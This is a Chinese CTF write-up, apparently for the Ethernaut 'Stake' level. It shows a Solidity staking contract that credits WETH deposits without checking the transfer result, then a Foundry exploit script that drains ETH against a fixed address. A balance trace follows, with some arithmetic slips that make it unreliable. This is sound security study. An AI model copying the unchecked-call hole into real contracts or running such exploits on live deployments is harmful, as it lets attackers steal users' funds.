# Stake 简单defi 质押

# 源码
Stake 合约的 ETH 余额必须大于 0。

totalStaked 必须大于 Stake 合约的 ETH 余额。 

你必须是一个质押者。 

你的质押余额必须为 0。  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//0x7aC26e0184B0Dc3C2aee52F22bdFbC5D35A565B4

contract Stake {
    uint256 public totalStaked; //所有用户总共质押的数量
    mapping(address => uint256) public UserStake; //记录每个用户质押了多少 token（ETH 或 WETH）
    mapping(address => bool) public Stakers; // 记录你有没有参与过质押
    address public WETH;

    constructor(address _weth) payable {
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }

    function StakeWETH(uint256 amount) public returns (bool) {
        require(amount > 0.001 ether, "Don't be cheap");
        (, bytes memory allowance) = WETH.call( //先call后改变状态
            abi.encodeWithSelector(0xdd62ed3e, msg.sender, address(this))
        ); //allowance，授权
        require(
            bytesToUint(allowance) >= amount, //刚刚 WETH 合约 allowance() 返回的 bytes 类型，强行转成 uint256
            "How am I moving the funds honey?"
        );
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(
            abi.encodeWithSelector(
                0x23b872dd,
                msg.sender,
                address(this),
                amount
            ) //transferFrom
        );
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool) {
        require(UserStake[msg.sender] >= amount, "Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        return success;
    }

    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20)) //把 bytes 强行转成 uint256
        }
        return result;
    }
}

```

# poc
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface IStake {
    function StakeETH() external payable;
}

contract Attack {
    IStake private immutable stake;

    constructor(address _stakeContract) payable {
        stake = IStake(_stakeContract);
    }

    function attack() external payable {
        stake.StakeETH{value: msg.value}();
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script, console2} from "../lib/forge-std/src/Script.sol";
import {Attack} from "../src/Attack.sol";

interface IStake {
    function StakeETH() external payable;

    function StakeWETH(uint256 amount) external returns (bool);

    function Unstake(uint256 amount) external returns (bool);

    function totalStaked() external view returns (uint256);

    function WETH() external view returns (address);
}

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Attacksc is Script {
    uint256 amount = 0.001 ether + 1 wei;
    IStake private immutable stake =
        IStake(0x63011C3cA3aCE5239E47Fcd7f0159D7F01CceA1E);
    IWETH private immutable weth = IWETH(stake.WETH());

    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x63011C3cA3aCE5239E47Fcd7f0159D7F01CceA1E);

        attack.attack{value: amount + 1 wei}(); //attack,0.001 ether + 2 wei

        stake.StakeETH{value: amount}(); //staker,0.001 ether + 1wei

        weth.approve(address(stake), amount); //授权staker可以支配0.001 ether + 1wei

        stake.StakeWETH(amount); //staker，0.001 ether + 1wei，

        stake.Unstake(amount * 2); //staker，(0.001 ether + 1wei)*2

        require(address(stake).balance > 0, "Stake balance == 0");

        vm.stopBroadcast();
    }
}

```

# 捋一下poc
1. attack调用<font style="background-color:#FBDFEF;">StakeETH(0.001 ether + 2 wei)</font>,此时 
+ totalStaked = 0.001 ether + 2 wei
+ UserStake[attacker] = 0.001 ether + 2 wei
+ 合约余额:0.001 ether + 2 wei
2. stake调用<font style="background-color:#FBDFEF;">StakeETH(0.001 ether + 1 wei)</font>,此时
+ totalStaked = 0.002 ether + 3 wei
+ UserStake[stake] = 0.001 ether + 2 wei
+ 合约余额:0.002 ether + 3 wei
3. stake调用<font style="background-color:#FBDFEF;">StakeWETH(0.001 ether + 1wei)</font>,此时
+ totalStaked = 0.003 ether + 4 wei
+ UserStake[attacker] = 0.001 ether + 2 wei
+ UserStake[stake] = 0.002 ether + 3 wei
+ 合约余额:0.002 ether + 3 wei
4. stake调用<font style="background-color:#FBDFEF;">Unstake(0.002 ether + 2wei)</font>,此时
+ UserStake[stake] = 1wei
+ totalStaked = 0.001 ether + 2 wei
+ 合约余额:1wei















> 更新: 2025-08-01 18:37:26  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/urixnm4inobkplo1>